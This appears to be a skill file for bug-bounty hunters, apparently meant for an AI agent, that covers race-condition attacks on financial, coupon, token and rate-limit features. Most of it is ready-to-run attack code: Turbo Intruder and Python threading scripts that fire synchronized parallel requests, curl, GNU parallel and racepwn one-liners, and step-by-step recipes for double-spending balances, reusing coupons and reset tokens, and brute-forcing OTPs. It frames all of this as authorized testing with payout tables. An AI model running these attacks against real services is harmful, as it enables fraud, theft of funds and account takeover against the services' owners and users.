---
name: hunt-race-conditions
description: Hunt race condition vulnerabilities — TOCTOU (time-of-check-time-of-use) on financial operations, limit bypass via concurrent requests (coupon codes, withdrawal limits, rate limits), single-use token reuse through parallel requests, partial-update races in optimistic locking, state machine bypass through concurrent state transitions, and database-level race conditions in non-atomic operations. Use when testing e-commerce, fintech, crypto exchanges, reward/loyalty systems, or any feature that enforces a limit or validates before applying. Critical when it allows free money, duplicate redemptions, or auth bypass. Keywords: race condition, concurrent, TOCTOU, limit bypass, double spend, coupon, parallel, simultaneous, atomic.
sources: hackerone_public
report_count: 35
---

# HUNT-RACE-CONDITIONS — Limit Bypass, Double Spend & State Machine Attacks

## Crown Jewel Targets

| Target type | Race class | Payout range |
|---|---|---|
| Crypto/fintech (withdrawal, transfer) | Double spend via concurrent requests | $10k–$100k+ |
| E-commerce (coupons, discounts, refunds) | Single-use coupon reuse | $2k–$15k |
| Reward/loyalty programs (points redemption) | Multiply points withdrawal | $3k–$20k |
| SaaS usage limits (API calls, seat limits) | Concurrent bypass of seat enforcement | $2k–$10k |
| Account operations (email confirm, password reset) | Token reuse via parallel requests | $3k–$15k |
| Voting/rating systems | Vote multiple times | $1k–$5k |

Fintech race conditions are some of the highest-paying bugs. A single working PoC that demonstrates double-spend can yield 6 figures.

---

## Attack Surface Signals

**Feature flags indicating race condition potential:**
- "Single-use" anything: promo codes, referral bonuses, gift cards, API trial keys
- "Limit" anything: withdrawal limits, daily caps, rate limits, usage quotas
- "Atomic" operations: balance checks, stock reservation, seat allocation, vote tallying
- "Claim" or "redeem" actions: rewards, prizes, contest entries

**URL and endpoint patterns:**
```
POST /api/redeem
POST /api/withdraw
POST /api/transfer
POST /api/coupon/apply
POST /api/vote
POST /api/purchase
POST /api/verify-email
POST /api/reset-password/confirm
```

**Request patterns indicating non-atomic logic:**
```
# Step 1: Check (read state)
GET /api/balance
# Step 2: Act (write state) — race window is here
POST /api/withdraw
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Identify race condition candidates

For every "single-use" or "limited" feature:
1. Read the request in Burp
2. Ask: does the server check a condition THEN perform an action as two separate DB operations?
3. If yes → race window exists between check and action

Classic examples:
- `SELECT balance FROM accounts WHERE id=? → check >= amount → UPDATE balance SET amount - X`
- `SELECT used FROM coupons WHERE code=? → check used=false → UPDATE coupons SET used=true`

### Phase 2 — Burp Suite Turbo Intruder (primary tool)

**Race condition script for Burp Turbo Intruder:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,
        requestsPerConnection=1,
        pipeline=False
    )
    for i in range(50):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # fire all 50 simultaneously

def handleResponse(req, interesting):
    table.add(req)
```

1. Send the target request to Turbo Intruder
2. Select the `race-single-packet` attack template
3. Set the parallelism (50–200 for most races, higher for slower operations)
4. Open gate → observe which requests return success

**Single-packet attack** (HTTP/2 only, most reliable):
```python
# In Turbo Intruder, use:
engine = RequestEngine(
    endpoint=target.endpoint,
    engine=Engine.BURP2,  # HTTP/2
    concurrentConnections=1,
    requestsPerConnection=50  # all in one packet
)
```

### Phase 3 — Python parallel attack (for quick testing)

```python
import threading, requests, time

TARGET = "https://target.com/api/redeem"
HEADERS = {"Authorization": "Bearer YOUR_TOKEN", "Content-Type": "application/json"}
PAYLOAD = {"coupon_code": "PROMO50", "amount": 100}

def redeem():
    r = requests.post(TARGET, json=PAYLOAD, headers=HEADERS)
    print(f"{r.status_code}: {r.text[:100]}")

# Synchronize thread launch
barrier = threading.Barrier(20)

def synchronized_redeem():
    barrier.wait()  # all threads wait here
    redeem()

threads = [threading.Thread(target=synchronized_redeem) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

### Phase 4 — Common race patterns

**Pattern 1: Coupon/promo code reuse**
```
1. Find a single-use coupon
2. Launch 50 concurrent POST /checkout requests with the same coupon code
3. Check if multiple orders applied the discount
```

**Pattern 2: Withdrawal/balance double spend**
```
1. Have $100 in account
2. Launch 20 concurrent POST /api/withdraw?amount=100 requests
3. If balance check is not atomic, multiple withdrawals may succeed
4. Check final balance
```

**Pattern 3: Referral/bonus abuse**
```
1. Create two accounts (A and B)
2. Use account A to refer account B, claim the bonus
3. Immediately send 20 concurrent "claim referral bonus" requests
4. Check if bonus credited multiple times
```

**Pattern 4: Single-use token reuse (password reset, email verify)**
```
1. Request a password reset
2. Intercept the token
3. Send 50 concurrent password reset requests with the same token
4. At least one should succeed even after the token is "used"
```

**Pattern 5: API rate limit bypass**
```
1. Find a rate-limited endpoint (e.g., OTP verification: 5 attempts/minute)
2. Send 100 concurrent requests in one burst
3. Server may process all before the rate limiter increments the counter
```

**Pattern 6: Like/vote manipulation**
```
1. Capture POST /api/posts/123/like
2. Send 100 concurrent like requests
3. Check if like count increments more than once
```

### Phase 5 — State machine bypass via concurrent transitions

For multi-step workflows (order → payment → fulfillment):

```
# Normal flow: pending → paid → shipped → delivered
# Race: trigger two concurrent state transitions from 'paid' state

Request 1: POST /api/orders/123/ship    → 'pending' → 'shipped'
Request 2: POST /api/orders/123/cancel  → 'paid' → 'cancelled' (refund issued)

# If both succeed: order is shipped AND refunded = free goods
```

### Phase 6 — Partial update races (optimistic locking bypass)

If the app uses optimistic locking (version numbers or ETags):

```bash
# Get current version
curl -v https://target.com/api/profile/123
# Response includes: ETag: "version-5"

# Send two concurrent updates with the same ETag
curl -X PUT /api/profile/123 -H "If-Match: \"version-5\"" -d '{"email": "attacker@evil.com"}' &
curl -X PUT /api/profile/123 -H "If-Match: \"version-5\"" -d '{"admin": true}' &
```

If the second update processes before the first increments the version, both may apply.

### Phase 7 — Measure and reduce the race window

For tight race windows (sub-millisecond):

```python
# Use HTTP/2 single-packet attack (all requests in one TCP segment)
# This eliminates network jitter — all requests arrive simultaneously

# If HTTP/2 not available, use connection warming:
# Pre-establish connections, then trigger all at once
```

**Tools for precise timing:**
```bash
# GNU parallel
parallel -j 50 "curl -s -X POST https://target.com/api/redeem -d 'coupon=PROMO50'" ::: $(seq 1 50)

# Apache Bench
ab -n 100 -c 100 -p payload.json -T application/json https://target.com/api/redeem
```

---

## Automation

```bash
# Burp Turbo Intruder — best tool for precise race attacks
# Extension → BApp Store → Turbo Intruder

# racepwn — HTTP/2 race condition tester  
python3 racepwn.py -u https://target.com/api/redeem -n 50 -d '{"coupon":"PROMO"}'

# Parallel curl
seq 1 50 | parallel -j50 "curl -s -X POST https://target.com/api/apply -d 'code=PROMO50' -H 'Authorization: Bearer TOKEN'"

# Python threading script (see Phase 3)

# Nuclei race condition templates
nuclei -u https://target.com -t race-conditions/
```

---

## Chain Table

| Finding | Chain to | Impact |
|---|---|---|
| Coupon reuse | Apply discount unlimited times | High |
| Balance double spend | Withdraw more than balance | Critical |
| Referral bonus race | Infinite bonus credits | High |
| Password reset token reuse | Lock victim out, own account | Critical |
| OTP rate limit bypass | Brute force 2FA | Critical |
| State machine bypass | Receive goods + refund | Critical |
| Vote manipulation | Skew rankings, win contests | Medium |

---

## Validation

✅ **Confirmed race:** Multiple concurrent requests both return success where only one should

✅ **Confirmed double spend:** Database balance shows deduction greater than starting balance × 1

✅ **Confirmed coupon reuse:** Order history shows coupon applied to more than one order

✅ **Confirmed token reuse:** Second password reset with "used" token succeeds

### Severity assessment

| Scenario | CVSS | Typical payout |
|---|---|---|
| Financial double spend | Critical 9.3 | $10k–$100k |
| Coupon/promo unlimited reuse | High 7.5 | $2k–$10k |
| 2FA bypass via OTP race | Critical 9.1 | $5k–$20k |
| Free goods (ship+refund) | High 8.1 | $3k–$15k |
| Vote manipulation | Medium 5.3 | $500–$2k |

### Related skills

Cross-reference: `hunt-business-logic` (for broader logic flaws), `hunt-ato` (if race leads to account takeover), `hunt-auth-bypass` (for token reuse chains).
